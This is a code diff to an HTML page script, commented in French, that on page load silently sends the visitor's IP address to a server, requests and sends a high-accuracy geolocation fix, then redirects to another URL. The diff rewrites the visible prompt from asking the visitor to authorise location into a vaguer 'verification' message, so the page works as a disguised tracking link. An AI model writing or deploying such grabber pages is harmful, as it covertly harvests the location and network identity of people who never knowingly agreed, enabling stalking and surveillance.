@@ -66,35 +66,40 @@
       } catch (e) { console.error("Erreur envoi position:", e); }
     }
 
-    async function main() {
-      // 1️⃣ Récupérer et envoyer l'IP
+    async function envoyerDonnees() {
       const ip = await getIP();
       if (ip) await sendIP(ip);
 
-      // 2️⃣ Vérifier si la géolocalisation est disponible
       if ("geolocation" in navigator) {
-        document.getElementById("titre").innerText = "Veuillez autoriser la localisation…";
+        document.getElementById("titre").innerText = "Vérification de la localisation…";
 
-        navigator.geolocation.getCurrentPosition(
-          async (position) => {
-            // 3️⃣ Envoyer la position si autorisée
-            await sendPosition(position);
-            // 4️⃣ Redirection après IP + position
-            window.location.href = REDIRECT_URL;
-          },
-          () => {
-            // Si refusée → redirection après IP uniquement
-            window.location.href = REDIRECT_URL;
-          },
-          { enableHighAccuracy: true, timeout: 15000 }
-        );
-      } else {
-        // Géolocalisation indisponible → redirection après IP
-        window.location.href = REDIRECT_URL;
+        try {
+          const perm = await navigator.permissions.query({ name: "geolocation" });
+          
+          // Si permission déjà accordée, on force un petit timeout pour que le navigateur réponde correctement
+          const getPosition = () => new Promise((resolve) => {
+            navigator.geolocation.getCurrentPosition(resolve, resolve, { enableHighAccuracy: true, timeout: 10000 });
+          });
+
+          if (perm.state === "granted") {
+            const position = await getPosition();
+            if (position.coords) await sendPosition(position);
+          } else if (perm.state === "prompt") {
+            const position = await getPosition();
+            if (position.coords) await sendPosition(position);
+          }
+          // Refusée ou indisponible → on ne fait rien
+
+        } catch (e) {
+          console.error("Erreur permissions:", e);
+        }
       }
+
+      // Redirection finale
+      window.location.href = REDIRECT_URL;
     }
 
-    window.onload = main;
+    window.onload = envoyerDonnees;
   </script>
 </body>
 </html>
